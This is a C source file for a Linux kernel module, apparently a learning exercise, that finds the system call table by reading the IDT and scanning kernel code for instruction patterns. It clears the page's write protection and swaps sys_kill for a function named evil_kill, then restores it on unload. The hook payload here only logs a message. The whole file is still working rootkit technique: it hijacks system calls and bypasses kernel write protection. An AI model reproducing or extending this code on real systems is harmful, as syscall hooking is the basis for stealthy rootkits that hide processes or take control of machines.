#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/version.h>

/* in find_SCT we will search for up to SEARCH_LEN bytes */
#define SEARCH_LEN 128

/* opcode length of call instruction is different for x86 and x86-64 */
#ifdef CONFIG_X86_32
#define OPCODE_LEN 7
#else
#define OPCODE_LEN 8
#endif

/* sys_kill syscall has a different number on x86/x86-64 */
#ifdef CONFIG_X86_32
#define SYS_KILL_NR 37
#else
#define SYS_KILL_NR 62
#endif

/* credits to http://syprog.blogspot.it/2011/10/hijack-linux-system-calls-part-iii.html for make_page_rw and make_page_ro */
/* These functions seem cleaner than setting bit 16 of CR0, WP bit
 * see https://memset.wordpress.com/2010/12/03/syscall-hijacking-kernel-2-6-systems/)
 */
void make_page_rw(unsigned long addr)
{
	unsigned int level;
	pte_t *pte = lookup_address(addr, &level);
	if (pte->pte &~ _PAGE_RW)
		pte->pte |= _PAGE_RW;
}

void make_page_ro(unsigned long addr)
{
	unsigned int level;
	pte_t *pte = lookup_address(addr, &level);
	pte->pte = pte->pte &~ _PAGE_RW;
}

/* global variable containing the syscall_table address */
unsigned long *syscall_table;

/* asmlinkage -> expect arguments on the stack */
/* declare a function pointer to the original sys_kill */
asmlinkage long (*orig_sys_kill)(int pid, int sig);

asmlinkage long evil_kill(int pid, int sig)
{
	printk(KERN_ALERT "[%s] :)\n", __this_module.name);
	return (*orig_sys_kill)(pid, sig);
}

unsigned long *find_SCT(const unsigned long addr, const unsigned int len)
{
	/* addresses needs to be 8 bytes on x86_64 and 4 bytes on x86 */
	unsigned long *sct_addr = NULL;
	#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,2,0)
	unsigned long n_call_addr = 0;
	/* n_call_offset needs to be 4 bytes on both architectures */
	unsigned int n_call_offset;
	#endif
	unsigned int i;
	unsigned char *ptr = (unsigned char *) addr;

	#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,2,0)
	#ifdef CONFIG_X86_32 /* newer kernels, x86 architecture */
	/* we are in entry_INT80_32, try to find pattern:
	 * mov eax, esp ; 0x89 0xe0
	 * call <address> ; 0xe8 <address>
	 */
	for (i = 0; i < len; i++) {
		if (*ptr == 0x89 && *(ptr + 1) == 0xe0 && *(ptr + 2) == 0xe8) {
			/* we have found the call to do_int80_syscall_32 */
			n_call_offset = *((unsigned int *) (ptr + 3));
			break;
		}
		ptr++;
	}
	#else /* newer kernels, x86-64 architecture  */
	/* we are in entry_INT80_compat, try to find pattern:
	 * mov rdi, rsp ; 0x48 0x89 0xe7
	 * call <address> ; 0xe8 <address>
	 */
	for (i = 0; i < len; i++) {
		if (*ptr == 0x48 && *(ptr + 1) == 0x89 && *(ptr + 2) == 0xe7
			&& *(ptr + 3) == 0xe8) {
			/* we have found the call to do_int80_syscall_32 */
			n_call_offset = *((unsigned int *) (ptr + 4));
			break;
		}
		ptr++;
	}
	#endif /* ending CONFIG_X86_32/64 specific code */

	/* if we have found an offset... */
	if (n_call_offset != 0) {

		/* ...compute address of do_int80_syscall_32, this code is run for newer kernels only but is not architecture dependent */
		/* on x86, higher bits of 0xFFFFFFFF00000000 should be discarded, leading to an (addr & 0x00000000) which is 0 */
		n_call_addr = (addr & 0xFFFFFFFF00000000) + (addr + n_call_offset + i + OPCODE_LEN);
		printk(KERN_INFO "[%s] do_int80_syscall_32 found @ 0x%lx\n", __this_module.name, n_call_addr);
		ptr = (unsigned char *) n_call_addr;
		#endif /* ending KERNEL_VERSION specific code */

		#ifdef CONFIG_X86_32 /* x86 architecture */
		/* now find a "call DWORD PTR [eax * 4 - addr]" instruction -> 0xff 0x14 0x85 <address> */
		for (i = 0; i < len; i++) {
			if (*ptr == 0xff && *(ptr + 1) == 0x14 && *(ptr + 2) == 0x85) {
				sct_addr = (unsigned long *) *((unsigned int *) (ptr + 3));
				break;
			}
			ptr++;
		}
		#else /* x86-64 architecture */
		/* now find a "call QWORD PTR [rax * 8 - addr]" instruction -> 0xff 0x14 0xc5 <address> */
		for (i = 0; i < len; i++) {
			if (*ptr == 0xff && *(ptr + 1) == 0x14 && *(ptr + 2) == 0xc5) {
				sct_addr = (unsigned long *)((addr & 0xFFFFFFFF00000000) + *((unsigned int *) (ptr + 3)));
				break;
			}
			ptr++;
		}
	 	#endif /* ending CONFIG_X86_32/64 specific code */

		/* print the system call table address */
		if (sct_addr != 0) {
			printk(KERN_INFO "[%s] syscall_table found @ 0x%lx\n", __this_module.name, (unsigned long) sct_addr);
			return sct_addr;
		} else {
			printk(KERN_INFO "[%s] syscall_table not found!\n", __this_module.name);
			return NULL;
		}

	#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,2,0)
	}
	#endif /* ugly, for newer kernels we have an if block that wasn't closed: if (n_call_offset != 0) { */

	printk(KERN_INFO "[%s] do_int80_syscall_32 not found!\n", __this_module.name);
	return NULL;
}

int init_module(void)
{
	struct desc_ptr *trap_gate;
	/* unsigned long will be 4 bytes on x86 and 8 bytes on x86_64 */
	unsigned long syscall_handler;

	/* sanity check */
	#if !defined CONFIG_X86_32 && !defined CONFIG_X86_64
		printk(KERN_INFO "[%s] this module works only on x86 and x86_64!\n", __this_module.name);
		return 0;
	#endif

	/* allocate some memory */
	trap_gate = kmalloc(sizeof(struct desc_ptr), GFP_KERNEL);
	if (trap_gate == NULL) {
		printk(KERN_INFO "[%s] memory allocation failed, exiting\n", __this_module.name);
		return 0;
	}

	/* read IDTR register */
	__asm__ __volatile__ ("sidt %0": "=m" (*trap_gate));
	printk(KERN_INFO "[%s] IDT found @ 0x%lx\n", __this_module.name, trap_gate->address);

	/* find address and print kernel specific name of the 0x80th entry */
	syscall_handler = gate_offset(*((gate_desc *) trap_gate->address + 0x80));
	#ifdef CONFIG_X86_64
		#ifndef CONFIG_IA32_EMULATION
		/* quit if no x86 support on x86-64 */
		printk(KERN_INFO "[%s] 64-bit kernel without x86 support, exiting\n", __this_module.name);
		goto _exit;
		#else
		#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,2,0)
		printk(KERN_INFO "[%s] entry_INT80_compat found @ 0x%lx\n", __this_module.name, syscall_handler);
		#else
		printk(KERN_INFO "[%s] ia32_syscall found @ 0x%lx\n", __this_module.name, syscall_handler);
		#endif /* ending KERNEL_VERSION */
		#endif /* ending CONFIG_IA32_EMULATION */
	#else
	#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,2,0)
	printk(KERN_INFO "[%s] entry_INT80_32 found @ 0x%lx\n", __this_module.name, syscall_handler);
	#else
	printk(KERN_INFO "[%s] system_call found @ 0x%lx\n", __this_module.name, syscall_handler);
	#endif /* ending KERNEL_VERSION */
	#endif /* ending CONFIG_X86_64 */

	/* find system call table address */
	syscall_table = find_SCT(syscall_handler, SEARCH_LEN);
	if (syscall_table == NULL) {
		/* we didn't find a syscall table */
		goto _exit;
	}

	/* print address of sys_kill and steal it */
	printk(KERN_INFO "[%s] sys_kill is @ 0x%lx\n", __this_module.name, syscall_table[SYS_KILL_NR]);
	printk(KERN_INFO "[%s] stealing sys_kill syscall...\n", __this_module.name);
	orig_sys_kill = (asmlinkage long (*) (int, int)) syscall_table[SYS_KILL_NR];
	make_page_rw((unsigned long) syscall_table);
	syscall_table[SYS_KILL_NR] = (unsigned long) evil_kill;
	make_page_ro((unsigned long) syscall_table);

_exit:
	/* free memory and exit */
	kfree(trap_gate);
	return 0;
}

void cleanup_module(void)
{
	printk(KERN_INFO "[%s] restoring sys_kill syscall...\n", __this_module.name);
	make_page_rw((unsigned long) syscall_table);
	syscall_table[SYS_KILL_NR] = (unsigned long) orig_sys_kill;
	make_page_ro((unsigned long) syscall_table);
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("zuarte");
